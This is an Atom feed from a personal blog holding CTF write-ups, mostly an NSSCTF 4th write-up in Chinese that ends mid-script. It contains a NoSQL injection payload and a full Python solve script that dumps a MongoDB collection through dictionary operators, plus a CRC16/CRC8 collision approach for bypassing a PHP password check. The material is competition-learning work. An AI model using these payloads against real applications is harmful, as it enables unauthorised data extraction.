<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HvAng&#39;s Nests</title>
  
  <subtitle>Nice to meet you!</subtitle>
  <link href="https://hvang10.github.io/atom.xml" rel="self"/>
  
  <link href="https://hvang10.github.io/"/>
  <updated>2025-08-25T18:09:48.871Z</updated>
  <id>https://hvang10.github.io/</id>
  
  <author>
    <name>HvAng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CNSS-Summer2025-Crypto-WriteUp</title>
    <link href="https://hvang10.github.io/2025/08/26/CNSS-Summer2025-Crypto-WriteUp/"/>
    <id>https://hvang10.github.io/2025/08/26/CNSS-Summer2025-Crypto-WriteUp/</id>
    <published>2025-08-25T17:56:23.000Z</published>
    <updated>2025-08-25T18:09:48.871Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9d84b5548d21d7787196332f15a0969af9852f05258c76adf8cb18dad4e1b97d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">The competition has not yet ended, and the content of write-up will not be made public for the time being.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>NSSCTF 4th-WriteUp</title>
    <link href="https://hvang10.github.io/2025/08/24/NSSCTF-4th-WriteUp/"/>
    <id>https://hvang10.github.io/2025/08/24/NSSCTF-4th-WriteUp/</id>
    <published>2025-08-24T10:25:48.000Z</published>
    <updated>2025-08-24T19:12:28.428Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://pic1.zhimg.com/80/v2-831f9285e57fba50f2eb1a6dc8c2b4eb_1440w.png" alt="" /><br />哦豁，这场化身<strong>AI大师</strong>，周末上大分</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="ez_signin"><a class="markdownIt-Anchor" href="#ez_signin"></a> ez_signin</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">client = MongoClient(<span class="string">&quot;mongodb://localhost:27017/&quot;</span>)</span><br><span class="line">db = client[<span class="string">&#x27;aggie_bookstore&#x27;</span>]</span><br><span class="line">books_collection = db[<span class="string">&#x27;books&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize</span>(<span class="params">input_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&#x27;[^a-zA-Z0-9\s]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, input_str)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/search&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">    query = &#123;<span class="string">&quot;$and&quot;</span>: []&#125;</span><br><span class="line">    books = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        title = request.args.get(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">        author = request.args.get(<span class="string">&#x27;author&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">        title_clean = sanitize(title)</span><br><span class="line">        author_clean = sanitize(author)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> title_clean:</span><br><span class="line">            query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: title_clean&#125;&#125;)  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> author_clean:</span><br><span class="line">            query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: author_clean&#125;&#125;) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> query[<span class="string">&quot;$and&quot;</span>]:</span><br><span class="line">            books = <span class="built_in">list</span>(books_collection.find(query))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.content_type == <span class="string">&#x27;application/json&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = request.get_json(force=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                title = data.get(<span class="string">&quot;title&quot;</span>)</span><br><span class="line">                author = data.get(<span class="string">&quot;author&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(title, <span class="built_in">str</span>):</span><br><span class="line">                    title = sanitize(title)</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: title&#125;)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(title, <span class="built_in">dict</span>):</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: title&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(author, <span class="built_in">str</span>):</span><br><span class="line">                    author = sanitize(author)</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: author&#125;)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(author, <span class="built_in">dict</span>):</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: author&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> query[<span class="string">&quot;$and&quot;</span>]:</span><br><span class="line">                    books = <span class="built_in">list</span>(books_collection.find(query))</span><br><span class="line">                    <span class="keyword">return</span> jsonify([</span><br><span class="line">                        &#123;<span class="string">&quot;title&quot;</span>: b.get(<span class="string">&quot;title&quot;</span>), <span class="string">&quot;author&quot;</span>: b.get(<span class="string">&quot;author&quot;</span>), <span class="string">&quot;description&quot;</span>: b.get(<span class="string">&quot;description&quot;</span>)&#125; <span class="keyword">for</span> b <span class="keyword">in</span> books</span><br><span class="line">                    ])</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Empty query&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Unsupported Content-Type&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p><strong>NoSQL 注入 (MongoDB 注入)</strong>，通过<code>post</code>字典参数，<strong>绕过</strong>过滤函数</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造目标 URL</span></span><br><span class="line">URL = <span class="string">&quot;http://node9.anna.nssctf.cn:29421/search&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 攻击载荷 (Payload) ---</span></span><br><span class="line"><span class="comment"># 利用 MongoDB 的 $regex 操作符来匹配所有文档，从而 dump 出全部数据。</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;.*&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;.*&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 请求头 ---</span></span><br><span class="line"><span class="comment"># 必须指定 Content-Type 为 application/json</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    发送恶意请求并获取 flag 的主函数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 准备攻击目标: <span class="subst">&#123;URL&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 使用的 Payload: <span class="subst">&#123;json.dumps(payload)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 发送 POST 请求</span></span><br><span class="line">        response = requests.post(URL, headers=headers, json=payload, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查响应状态码</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n[+] 请求成功！服务器返回状态码 200 OK。&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 解析返回的 JSON 数据</span></span><br><span class="line">                books = response.json()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> books:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] 查询成功，但未返回任何书籍信息。&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] 查询到以下书籍信息：&quot;</span>)</span><br><span class="line">                <span class="comment"># 格式化输出结果</span></span><br><span class="line">                <span class="keyword">for</span> i, book <span class="keyword">in</span> <span class="built_in">enumerate</span>(books, <span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n--- 第 <span class="subst">&#123;i&#125;</span> 本书 ---&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  书名 (Title): <span class="subst">&#123;book.get(<span class="string">&#x27;title&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  作者 (Author): <span class="subst">&#123;book.get(<span class="string">&#x27;author&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  描述 (Description): <span class="subst">&#123;book.get(<span class="string">&#x27;description&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n[*] Flag 可能隐藏在以上信息中，请仔细查找。&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] 错误：无法解析服务器返回的 JSON 数据。&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    原始响应内容: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 攻击失败！服务器返回状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    响应内容: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 请求过程中发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 发生未知错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure><h2 id="ezcrc"><a class="markdownIt-Anchor" href="#ezcrc"></a> EzCRC</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compute_crc16</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$checksum</span> = <span class="number">0xFFFF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$checksum</span> ^= <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">8</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$checksum</span> &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable">$checksum</span> = ((<span class="variable">$checksum</span> &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xA001</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$checksum</span> &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$checksum</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calculate_crc8</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$crc8_table</span> = [</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x0E</span>, <span class="number">0x09</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x12</span>, <span class="number">0x15</span>,</span><br><span class="line">        <span class="number">0x38</span>, <span class="number">0x3F</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>,</span><br><span class="line">        <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x79</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x65</span>,</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x4F</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>,</span><br><span class="line">        <span class="number">0xE0</span>, <span class="number">0xE7</span>, <span class="number">0xEE</span>, <span class="number">0xE9</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xF2</span>, <span class="number">0xF5</span>,</span><br><span class="line">        <span class="number">0xD8</span>, <span class="number">0xDF</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0xC3</span>, <span class="number">0xCA</span>, <span class="number">0xCD</span>,</span><br><span class="line">        <span class="number">0x90</span>, <span class="number">0x97</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0x8C</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0x85</span>,</span><br><span class="line">        <span class="number">0xA8</span>, <span class="number">0xAF</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>,</span><br><span class="line">        <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0xDB</span>, <span class="number">0xDC</span>, <span class="number">0xD5</span>, <span class="number">0xD2</span>,</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xED</span>, <span class="number">0xEA</span>,</span><br><span class="line">        <span class="number">0xB7</span>, <span class="number">0xB0</span>, <span class="number">0xB9</span>, <span class="number">0xBE</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0xA2</span>,</span><br><span class="line">        <span class="number">0x8F</span>, <span class="number">0x88</span>, <span class="number">0x81</span>, <span class="number">0x86</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x9D</span>, <span class="number">0x9A</span>,</span><br><span class="line">        <span class="number">0x27</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x35</span>, <span class="number">0x32</span>,</span><br><span class="line">        <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0x11</span>, <span class="number">0x16</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>,</span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0x5E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x42</span>,</span><br><span class="line">        <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>,</span><br><span class="line">        <span class="number">0x89</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0x80</span>, <span class="number">0x95</span>, <span class="number">0x92</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>,</span><br><span class="line">        <span class="number">0xB1</span>, <span class="number">0xB6</span>, <span class="number">0xBF</span>, <span class="number">0xB8</span>, <span class="number">0xAD</span>, <span class="number">0xAA</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>,</span><br><span class="line">        <span class="number">0xF9</span>, <span class="number">0xFE</span>, <span class="number">0xF7</span>, <span class="number">0xF0</span>, <span class="number">0xE5</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>,</span><br><span class="line">        <span class="number">0xC1</span>, <span class="number">0xC6</span>, <span class="number">0xCF</span>, <span class="number">0xC8</span>, <span class="number">0xDD</span>, <span class="number">0xDA</span>, <span class="number">0xD3</span>, <span class="number">0xD4</span>,</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>,</span><br><span class="line">        <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x4D</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, <span class="number">0x44</span>,</span><br><span class="line">        <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>,</span><br><span class="line">        <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x3D</span>, <span class="number">0x3A</span>, <span class="number">0x33</span>, <span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x40</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>,</span><br><span class="line">        <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x7F</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x64</span>, <span class="number">0x63</span>,</span><br><span class="line">        <span class="number">0x3E</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>,</span><br><span class="line">        <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x13</span>,</span><br><span class="line">        <span class="number">0xAE</span>, <span class="number">0xA9</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xBC</span>, <span class="number">0xBB</span>,</span><br><span class="line">        <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0x98</span>, <span class="number">0x9F</span>, <span class="number">0x8A</span>, <span class="number">0x8D</span>, <span class="number">0x84</span>, <span class="number">0x83</span>,</span><br><span class="line">        <span class="number">0xDE</span>, <span class="number">0xD9</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xC2</span>, <span class="number">0xC5</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>,</span><br><span class="line">        <span class="number">0xE6</span>, <span class="number">0xE1</span>, <span class="number">0xE8</span>, <span class="number">0xEF</span>, <span class="number">0xFA</span>, <span class="number">0xFD</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$bytes</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;C*&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    <span class="variable">$length</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$bytes</span>);</span><br><span class="line">    <span class="variable">$crc</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">1</span>; <span class="variable">$k</span> &lt;= <span class="variable">$length</span>; <span class="variable">$k</span>++) &#123;</span><br><span class="line">        <span class="variable">$crc</span> = <span class="variable">$crc8_table</span>[(<span class="variable">$crc</span> ^ <span class="variable">$bytes</span>[<span class="variable">$k</span>]) &amp; <span class="number">0xff</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$crc</span> &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$SECRET_PASS</span> = <span class="string">&quot;Enj0yNSSCTF4th!&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$SECRET_PASS</span>) == <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$correct_pass_crc16</span> = <span class="title function_ invoke__">compute_crc16</span>(<span class="variable">$SECRET_PASS</span>);</span><br><span class="line">    <span class="variable">$correct_pass_crc8</span> = <span class="title function_ invoke__">calculate_crc8</span>(<span class="variable">$SECRET_PASS</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user_input</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_pass_crc16</span> = <span class="title function_ invoke__">compute_crc16</span>(<span class="variable">$user_input</span>);</span><br><span class="line">    <span class="variable">$user_pass_crc8</span> = <span class="title function_ invoke__">calculate_crc8</span>(<span class="variable">$user_input</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$SECRET_PASS</span> === <span class="variable">$user_input</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这样不行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$correct_pass_crc16</span> !== <span class="variable">$user_pass_crc16</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这样也不行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$correct_pass_crc8</span> !== <span class="variable">$user_pass_crc8</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这样还是不行吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$granted_access</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$granted_access</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;都到这份上了,flag就给你了: <span class="subst">$FLAG</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;不不不&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;再试试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要构造长度<code>15</code>的字符串，且<code>crc8</code>与<code>crc16</code>要与题目字符串的<code>crc</code>值一样，直接敲打<code>GPT</code>生成一份<strong>三字节翻转</strong>脚本</p><blockquote><p>CRC（包括 CRC16/CRC8）对二进制翻转是线性的。选择若干字节位（3个字节24个二进制变量），把“目标CRC差值”表示成这些位的线性组合，相当于是求解GF(2)线性方程组。<br />通过高效的GF(2)线性代数（构造基并表示向量），求出一组位翻转，使得修改后的字符串与secret的CRC16+CRC8完全相同。</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">crc_collision.py</span></span><br><span class="line"><span class="string">Find a different message (same length) that is NOT equal to the secret but has identical CRC16 and CRC8.</span></span><br><span class="line"><span class="string">Method:</span></span><br><span class="line"><span class="string"> - Choose k byte positions to allow flipping (default k=3 -&gt; 24 binary variables).</span></span><br><span class="line"><span class="string"> - For a given base message, precompute the 24-bit effect (&quot;columns&quot;) of flipping each single bit</span></span><br><span class="line"><span class="string">   in those positions. The combined CRC (CRC16&lt;&lt;8 | CRC8) is a 24-bit linear function over GF(2).</span></span><br><span class="line"><span class="string"> - Build a GF(2) basis from the columns, then try to represent the difference between base_crc24 and</span></span><br><span class="line"><span class="string">   target_crc24 as an XOR of columns. If representable, we get which bits to flip -&gt; candidate message.</span></span><br><span class="line"><span class="string"> - Repeat for random base messages or different position sets until a valid candidate is found.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- CRC implementations matching the PHP code 